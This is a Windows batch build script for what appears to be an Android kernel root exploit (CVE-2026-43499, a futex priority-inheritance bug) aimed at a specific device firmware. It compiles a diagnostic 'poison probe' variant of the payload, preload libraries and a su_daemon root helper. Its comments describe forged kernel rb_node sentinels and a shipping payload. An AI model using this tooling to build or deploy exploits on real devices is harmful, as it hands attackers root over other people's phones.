@echo off
rem ============================================================================
rem POISON PROBE BUILD - EXPERIMENT ONLY, NEVER DEPLOY
rem ============================================================================
rem Builds with -DFUTEX_POISON_PROBE=1, which arms the v14 payload with two
rem distinct non-canonical sentinels in place of the write target. The kernel
rem will fault at whichever forged rb_node it actually erases, and the faulting
rem address names the route. See src/futex_pi_v14.h for the decoding table.
rem
rem This build MUST NOT be pushed, published to the feed, or installed as the
rem shipping payload. It writes build\f946b-poison\ and touches nothing else.
rem ============================================================================
set NDK=C:\Users\admin\AppData\Local\Android\Sdk\ndk\30.0.15729638
set CC=%NDK%\toolchains\llvm\prebuilt\windows-x86_64\bin\aarch64-linux-android35-clang.cmd
set OUTDIR=build\f946b-poison
set TH=-DTARGET_HEADER=\"targets/f946b-F946BXXS7GZE5/target.h\"
set POISON=-DFUTEX_POISON_PROBE=1
set OPT=-O2 -g0 -Wall -Wextra -march=armv8-a+crc+crypto -mtune=cortex-a715 -flto=thin -ffunction-sections -fdata-sections -fomit-frame-pointer -fno-unwind-tables -fno-asynchronous-unwind-tables -fvisibility=hidden -Wno-unused-parameter -Wno-sign-compare
set LDOPT=-flto=thin -Wl,--gc-sections -Wl,-O3
if not exist %OUTDIR% mkdir %OUTDIR%

echo === Building POISON preload (root-umh) ===
call %CC% %POISON% -fPIC %OPT% -Isrc %TH% src/main.c src/util.c src/slide.c src/fops.c src/pipe.c src/root.c src/preload.c src/futex_pi_v14.c -shared -pthread -Wl,--no-as-needed -llog -Wl,--as-needed %LDOPT% -o %OUTDIR%/cve-2026-43499
if errorlevel 1 (echo POISON PRELOAD BUILD FAILED & exit /b 1)

echo === Building POISON app preload (MCAST stack writer) ===
call %CC% %POISON% -DAPP_PAYLOAD=1 -DSLIDE_STACK_WRITER=1 -fPIC %OPT% -Isrc %TH% src/main.c src/util.c src/slide_app.c src/fops.c src/pipe.c src/root.c src/preload.c src/futex_pi_v14.c -shared -pthread -Wl,--no-as-needed -llog -Wl,--as-needed %LDOPT% -o %OUTDIR%/cve-2026-43499-app.so
if errorlevel 1 (echo POISON APP BUILD FAILED & exit /b 1)

echo === Building root helper (unaffected by the probe) ===
call %CC% -fPIE -pie %OPT% src/su_daemon.c -ldl %LDOPT% -o %OUTDIR%/cve-2026-43499-root
if errorlevel 1 (echo ROOT HELPER BUILD FAILED & exit /b 1)

echo === POISON BUILD OK - DO NOT DEPLOY ===
